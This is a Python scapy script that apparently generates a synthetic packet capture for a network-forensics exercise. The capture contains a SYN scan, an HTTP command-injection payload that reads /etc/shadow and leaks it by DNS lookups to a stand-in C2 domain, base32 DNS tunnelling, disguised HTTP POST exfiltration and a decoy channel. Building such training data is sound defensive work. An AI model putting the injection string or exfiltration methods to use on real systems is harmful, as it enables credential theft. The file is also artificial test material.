#!/usr/bin/env python3
"""Generate a realistic PCAP with multi-stage intrusion, multi-channel exfiltration,
and anti-forensics decoy channel.

Stages:
  1. Background normal traffic (DNS, HTTP, CDN-style queries)
  2. SYN scan reconnaissance from external attacker
  3. Command injection exploit via HTTP POST
  4. Primary exfiltration: DNS tunneling (base32-encoded subdomains)
  5. Secondary exfiltration: HTTP POST covert channel (hex-encoded JSON payloads)
  6. Decoy: DNS tunneling to a different domain with base32-encoded random bytes
"""

from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap
import base64
import json
import random
import os

random.seed(42)

pkts = []
T0 = 1700000000.0

# Consistent MACs for Ethernet framing (values don't matter for analysis)
MAC_A = "02:00:00:00:00:01"
MAC_B = "02:00:00:00:00:02"

def eth():
    return Ether(src=MAC_A, dst=MAC_B)

# --- Network topology ---
ATTACKER = "203.0.113.50"
TARGET = "10.1.1.100"
INTERNAL = ["10.1.1.100", "10.1.1.101", "10.1.1.102"]
DNS_SRV = "10.1.1.1"
C2_DOM = "data.c2server.xyz"
DECOY_DOM = "metrics.svcmon.io"
HTTP_EXFIL_DST = "198.51.100.77"
HTTP_EXFIL_PORT = 9090  # Non-standard port

# The secret data being exfiltrated (config file contents)
EXFIL = (
    "DB_HOST=proddb.internal:5432\n"
    "DB_USER=admin\n"
    "DB_PASS=xK9mP2vL8qR5nT3w\n"
    "API_KEY=AKIAIOSFODNN7EXAMPLE\n"
    "API_SECRET=wJalrXUtnFEMIbPxRfiCYEXAMPLEKEY"
)

NORMAL_DOMAINS = [
    "www.google.com", "mail.google.com", "cdn.cloudflare.com",
    "api.github.com", "update.microsoft.com", "fonts.googleapis.com",
    "www.example.com", "login.microsoftonline.com", "s3.amazonaws.com",
    "registry.npmjs.org", "pypi.org", "dl.google.com",
]

# ======================================================================
# BACKGROUND: Normal DNS traffic (250 query-response pairs)
# ======================================================================
t = T0
for i in range(250):
    src = random.choice(INTERNAL)
    dom = random.choice(NORMAL_DOMAINS)
    t += random.uniform(0.05, 0.8)
    sp = random.randint(1024, 65535)
    tid = random.randint(0, 65535)

    q = eth() / IP(src=src, dst=DNS_SRV) / UDP(sport=sp, dport=53) / DNS(
        id=tid, rd=1, qd=DNSQR(qname=dom, qtype="A"))
    q.time = t
    pkts.append(q)

    t += random.uniform(0.005, 0.05)
    r = eth() / IP(src=DNS_SRV, dst=src) / UDP(sport=53, dport=sp) / DNS(
        id=tid, qr=1, aa=1, qd=DNSQR(qname=dom, qtype="A"),
        an=DNSRR(rrname=dom,
                 rdata=f"93.184.{random.randint(1,254)}.{random.randint(1,254)}",
                 ttl=300))
    r.time = t
    pkts.append(r)

# ======================================================================
# BACKGROUND: Normal HTTP traffic (60 GET requests)
# ======================================================================
for i in range(60):
    src = random.choice(INTERNAL)
    dst = f"93.184.{random.randint(1,254)}.{random.randint(1,254)}"
    sp = random.randint(1024, 65535)
    t += random.uniform(0.1, 1.5)
    paths = ["index.html", "api/v1/data", "status", "health", "assets/style.css"]
    p = eth() / IP(src=src, dst=dst) / TCP(sport=sp, dport=80, flags="PA",
                                    seq=1000, ack=1000) / Raw(
        load=(f"GET /{random.choice(paths)} HTTP/1.1\r\n"
              f"Host: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n").encode())
    p.time = t
    pkts.append(p)

# ======================================================================
# BACKGROUND: CDN-like DNS with long subdomains (noise / red herrings)
# ======================================================================
cdn_names = [
    "e1234567890abcdef.cloudfront.net",
    "a1b2c3d4e5f6g7h8i9j0.cdn.example.com",
    "prod-static-assets-v2.storage.googleapis.com",
    "tracking-pixel-eu-west-1.analytics.example.net",
    "ab12cd34ef56.tile.openstreetmap.org",
    "sni1234567.cloudflaressl.com",
    "www-widgetapi.pp-static-cdn.example.org",
]
for i in range(20):
    src = random.choice(INTERNAL)
    dom = random.choice(cdn_names)
    t += random.uniform(0.1, 0.5)
    sp = random.randint(1024, 65535)
    tid = random.randint(0, 65535)
    q = eth() / IP(src=src, dst=DNS_SRV) / UDP(sport=sp, dport=53) / DNS(
        id=tid, rd=1, qd=DNSQR(qname=dom, qtype="A"))
    q.time = t
    pkts.append(q)
    t += random.uniform(0.005, 0.03)
    r = eth() / IP(src=DNS_SRV, dst=src) / UDP(sport=53, dport=sp) / DNS(
        id=tid, qr=1, aa=1, qd=DNSQR(qname=dom, qtype="A"),
        an=DNSRR(rrname=dom,
                 rdata=f"104.16.{random.randint(1,254)}.{random.randint(1,254)}",
                 ttl=60))
    r.time = t
    pkts.append(r)

# ======================================================================
# STAGE 1: SYN scan from attacker (150 ports)
# ======================================================================
must_scan = [22, 80, 443, 8080]
other_ports = [p for p in range(20, 10001) if p not in must_scan]
additional = random.sample(other_ports, 146)
scanned = sorted(must_scan + additional)
open_ports = [22, 80, 443, 8080]

ts = T0 + 25.0
for port in scanned:
    ts += random.uniform(0.002, 0.015)
    sp = random.randint(40000, 60000)
    sq = random.randint(0, 2**32 - 1)

    syn = eth() / IP(src=ATTACKER, dst=TARGET) / TCP(sport=sp, dport=port,
                                              flags="S", seq=sq)
    syn.time = ts
    pkts.append(syn)

    ts += random.uniform(0.001, 0.008)
    if port in open_ports:
        sa = eth() / IP(src=TARGET, dst=ATTACKER) / TCP(sport=port, dport=sp,
                flags="SA", seq=random.randint(0, 2**32-1), ack=sq + 1)
        sa.time = ts
        pkts.append(sa)
        ts += random.uniform(0.001, 0.005)
        rst = eth() / IP(src=ATTACKER, dst=TARGET) / TCP(sport=sp, dport=port,
                                                  flags="R", seq=sq + 1)
        rst.time = ts
        pkts.append(rst)
    else:
        ra = eth() / IP(src=TARGET, dst=ATTACKER) / TCP(sport=port, dport=sp,
                flags="RA", seq=0, ack=sq + 1)
        ra.time = ts
        pkts.append(ra)

# ======================================================================
# STAGE 2: Command injection exploit via HTTP POST to port 8080
# ======================================================================
te = T0 + 55.0
ESPORT = 45678

body = ("target=127.0.0.1%3Bcat+/etc/shadow+/var/lib/app/db.conf"
        "|base32+-w0|fold+-w40|while+read+l%3Bdo+host+"
        "%24l.data.c2server.xyz%3Bdone")
hdrs = (f"POST /api/diagnostic HTTP/1.1\r\n"
        f"Host: 10.1.1.100:8080\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n")
exploit_payload = (hdrs + body).encode()

# TCP three-way handshake
syn = eth() / IP(src=ATTACKER, dst=TARGET) / TCP(sport=ESPORT, dport=8080,
                                          flags="S", seq=100000)
syn.time = te
pkts.append(syn)
te += 0.003
sa = eth() / IP(src=TARGET, dst=ATTACKER) / TCP(sport=8080, dport=ESPORT,
                                         flags="SA", seq=200000, ack=100001)
sa.time = te
pkts.append(sa)
te += 0.002
ack = eth() / IP(src=ATTACKER, dst=TARGET) / TCP(sport=ESPORT, dport=8080,
                                          flags="A", seq=100001, ack=200001)
ack.time = te
pkts.append(ack)

# Send exploit
te += 0.005
ep = eth() / IP(src=ATTACKER, dst=TARGET) / TCP(sport=ESPORT, dport=8080,
        flags="PA", seq=100001, ack=200001) / Raw(load=exploit_payload)
ep.time = te
pkts.append(ep)

# Server ACK
te += 0.001
sack = eth() / IP(src=TARGET, dst=ATTACKER) / TCP(sport=8080, dport=ESPORT,
        flags="A", seq=200001, ack=100001 + len(exploit_payload))
sack.time = te
pkts.append(sack)

# Server HTTP response
te += 0.15
resp_body = '{"status":"success","output":"PING 127.0.0.1 OK"}'
resp = (f"HTTP/1.1 200 OK\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(resp_body)}\r\n"
        f"\r\n"
        f"{resp_body}").encode()
rp = eth() / IP(src=TARGET, dst=ATTACKER) / TCP(sport=8080, dport=ESPORT,
        flags="PA", seq=200001,
        ack=100001 + len(exploit_payload)) / Raw(load=resp)
rp.time = te
pkts.append(rp)

# ======================================================================
# STAGE 3a: Primary DNS tunneling exfiltration (base32 subdomains)
# ======================================================================
encoded = base64.b32encode(EXFIL.encode()).decode().rstrip('=').lower()
CHUNK = 40
chunks = [encoded[i:i + CHUNK] for i in range(0, len(encoded), CHUNK)]

tx = T0 + 70.0
for ch in chunks:
    tx += random.uniform(0.3, 1.5)
    qn = f"{ch}.{C2_DOM}"
    sp = random.randint(1024, 65535)
    tid = random.randint(0, 65535)

    q = eth() / IP(src=TARGET, dst=DNS_SRV) / UDP(sport=sp, dport=53) / DNS(
        id=tid, rd=1, qd=DNSQR(qname=qn, qtype="TXT"))
    q.time = tx
    pkts.append(q)

    tx += random.uniform(0.01, 0.05)
    r = eth() / IP(src=DNS_SRV, dst=TARGET) / UDP(sport=53, dport=sp) / DNS(
        id=tid, qr=1, rcode=3, qd=DNSQR(qname=qn, qtype="TXT"))
    r.time = tx
    pkts.append(r)

# ======================================================================
# STAGE 3b: Secondary HTTP POST exfiltration (hex-encoded JSON payloads)
# ======================================================================
hex_encoded = EXFIL.encode().hex()
hex_chunk_size = len(hex_encoded) // 4
if len(hex_encoded) % 4:
    hex_chunk_size += 1
hex_chunks = [hex_encoded[i:i + hex_chunk_size]
              for i in range(0, len(hex_encoded), hex_chunk_size)]

th = T0 + 72.0
for idx, hchunk in enumerate(hex_chunks):
    th += random.uniform(1.0, 3.0)
    sport = 50000 + idx
    seq_c = 300000 + idx * 10000
    seq_s = 400000 + idx * 10000

    # TCP handshake
    syn = eth() / IP(src=TARGET, dst=HTTP_EXFIL_DST) / TCP(sport=sport,
              dport=HTTP_EXFIL_PORT, flags="S", seq=seq_c)
    syn.time = th
    pkts.append(syn)
    th += 0.015
    sa = eth() / IP(src=HTTP_EXFIL_DST, dst=TARGET) / TCP(sport=HTTP_EXFIL_PORT,
              dport=sport, flags="SA", seq=seq_s, ack=seq_c + 1)
    sa.time = th
    pkts.append(sa)
    th += 0.008
    ack = eth() / IP(src=TARGET, dst=HTTP_EXFIL_DST) / TCP(sport=sport,
              dport=HTTP_EXFIL_PORT, flags="A", seq=seq_c + 1, ack=seq_s + 1)
    ack.time = th
    pkts.append(ack)

    # POST request with hex-encoded data
    post_body = json.dumps({
        "event": "metric_report",
        "ts": int(th),
        "payload": hchunk,
        "part": idx + 1,
        "of": len(hex_chunks),
        "src": "prod-web-01",
    })
    post_req = (f"POST /api/v1/events HTTP/1.1\r\n"
                f"Host: analytics.cdn-metrics.net\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(post_body)}\r\n"
                f"\r\n"
                f"{post_body}").encode()
    th += 0.005
    req_pkt = eth() / IP(src=TARGET, dst=HTTP_EXFIL_DST) / TCP(
        sport=sport, dport=HTTP_EXFIL_PORT, flags="PA",
        seq=seq_c + 1, ack=seq_s + 1) / Raw(load=post_req)
    req_pkt.time = th
    pkts.append(req_pkt)

    # Server ACK + response
    th += 0.1
    srv_resp_body = '{"status":"ok"}'
    srv_resp = (f"HTTP/1.1 200 OK\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(srv_resp_body)}\r\n"
                f"\r\n"
                f"{srv_resp_body}").encode()
    resp_pkt = eth() / IP(src=HTTP_EXFIL_DST, dst=TARGET) / TCP(
        sport=HTTP_EXFIL_PORT, dport=sport, flags="PA",
        seq=seq_s + 1, ack=seq_c + 1 + len(post_req)) / Raw(load=srv_resp)
    resp_pkt.time = th
    pkts.append(resp_pkt)

# ======================================================================
# STAGE 3c: DNS tunneling DECOY (anti-forensics — base32 random bytes)
# ======================================================================
decoy_rng = random.Random(99)
decoy_raw = bytes(decoy_rng.getrandbits(8) for _ in range(125))
decoy_encoded = base64.b32encode(decoy_raw).decode().rstrip('=').lower()
DECOY_CHUNK = 40
decoy_chunks = [decoy_encoded[i:i + DECOY_CHUNK]
                for i in range(0, len(decoy_encoded), DECOY_CHUNK)][:5]

td = T0 + 73.0
for ch in decoy_chunks:
    td += random.uniform(0.4, 1.8)
    qn = f"{ch}.{DECOY_DOM}"
    sp = random.randint(1024, 65535)
    tid = random.randint(0, 65535)

    q = eth() / IP(src=TARGET, dst=DNS_SRV) / UDP(sport=sp, dport=53) / DNS(
        id=tid, rd=1, qd=DNSQR(qname=qn, qtype="TXT"))
    q.time = td
    pkts.append(q)

    td += random.uniform(0.01, 0.05)
    r = eth() / IP(src=DNS_SRV, dst=TARGET) / UDP(sport=53, dport=sp) / DNS(
        id=tid, qr=1, rcode=3, qd=DNSQR(qname=qn, qtype="TXT"))
    r.time = td
    pkts.append(r)

# ======================================================================
# Sort all packets chronologically and write PCAP
# ======================================================================
pkts.sort(key=lambda p: float(p.time))

os.makedirs("/app", exist_ok=True)
wrpcap("/app/incident.pcap", pkts)
print(f"Generated PCAP: {len(pkts)} packets")
print(f"DNS tunnel chunks (real): {len(chunks)}")
print(f"HTTP exfil chunks: {len(hex_chunks)}, port: {HTTP_EXFIL_PORT}")
print(f"DNS decoy chunks: {len(decoy_chunks)}")

# Verify critical packet counts
assert len(chunks) > 0, "No DNS tunnel chunks generated"
assert len(hex_chunks) > 0, "No HTTP exfil chunks generated"
assert len(decoy_chunks) > 0, "No DNS decoy chunks generated"
